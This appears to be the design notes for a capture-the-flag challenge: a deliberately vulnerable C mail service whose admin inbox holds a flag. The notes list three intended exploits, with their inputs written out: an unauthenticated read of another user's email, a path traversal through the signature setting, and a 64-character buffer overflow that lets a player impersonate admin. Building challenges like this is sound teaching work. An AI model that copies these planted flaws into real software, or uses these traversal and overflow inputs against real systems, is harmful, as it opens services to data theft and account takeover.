### The Scenario

- **The Service:** A C program listening on port 9999.
- **The Bot:** Periodically connects and sends an email:
  - `FROM: flags@ctf.game`

  - `TO: admin`

  - `SUBJECT: Flag #123`

  - `BODY: CTF{fl4g_v4lu3_h3r3}`

- **The Player:** Can connect, create their own user, send emails, and retrieve their own emails.
- **The Goal:** Exploit the service to read the emails in the `admin` inbox.

### How the Bot should interact

Now your Flag Bot can function normally using the password:

**Bot Connection Flow:**

1. Connect to port 9999
2. Send: `LOGIN admin supersecretbotpass`
3. Receive: `200 Admin login successful`
4. Send: `SEND admin Flag#1 CTF{flag_value_here}`
5. Receive: `200 Sent (ID: <id>)`
6. Disconnect

### How the Players Exploit it

**Method 1: No login verification**

```Bash
LOGIN player
READ 1
# Server searches all folders, finds data/admin/inbox/1.eml, and prints it.
```

**Method 2: Signature Traversal**

```bash
LOGIN player
SET_SIG ../admin/inbox/1.eml
SEND player test_msg
# Server attaches admin's email to the player's own email
READ <new_id>
# Player reads their own email and sees the flag at the bottom.
```

**Method 3: Buffer Overflow (Impersonation)**

```bash
LOGIN player
WHOAMI
# > 200 You are player

# 64 chars of filler + "admin"
ECHO AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAadmin

WHOAMI
# > 200 You are admin

READ 1
# Now you are legitimately admin, so you can read the file even if IDOR was patched.
```
